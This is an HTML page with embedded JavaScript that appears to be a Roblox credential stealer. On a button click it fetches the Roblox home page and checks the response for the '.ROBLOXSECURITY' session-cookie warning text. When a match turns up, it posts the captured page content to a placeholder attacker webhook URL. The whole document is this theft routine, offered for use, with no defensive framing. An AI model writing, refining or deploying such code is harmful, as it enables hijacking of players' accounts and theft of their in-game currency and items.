<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Search and Send</title>
</head>
<body>
    <button id="searchButton">Search and Send</button>

    <script>
        document.getElementById("searchButton").addEventListener("click", function() {
            // Open Roblox home page in a new tab
            window.open("https://roblox.com/home", "_blank");

            // Start the search process in the current tab
            setTimeout(searchWebsite, 5000); // Delay to give time for the new tab to open
        });

        function searchWebsite() {
            var xhr = new XMLHttpRequest();
            xhr.open("GET", "https://roblox.com/home", true);
            xhr.onload = function() {
                if (xhr.status === 200) {
                    var result = xhr.responseText;

                    // Define the search strings
                    var searchStrings = [
                        "|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|",
                        ".ROBLOXSECURITY"
                    ];

                    // Check if the response contains any of the search strings
                    var found = searchStrings.some(function(str) {
                        return result.includes(str);
                    });

                    if (found) {
                        sendToWebhook(result);
                    } else {
                        console.log("No matches found");
                    }
                } else {
                    console.error("Error: " + xhr.status);
                }
            };
            xhr.onerror = function() {
                console.error("Request failed");
            };
            xhr.send();
        }

        function sendToWebhook(data) {
            var webhookUrl = "YOUR_WEBHOOK_URL";
            var xhr = new XMLHttpRequest();
            xhr.open("POST", webhookUrl, true);
            xhr.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
            xhr.onload = function() {
                if (xhr.status === 200) {
                    console.log("Successfully sent to webhook");
                } else {
                    console.error("Error sending to webhook: " + xhr.status);
                }
            };
            xhr.onerror = function() {
                console.error("Webhook request failed");
            };
            xhr.send(JSON.stringify({ content: data }));
        }
    </script>
</body>
</html>
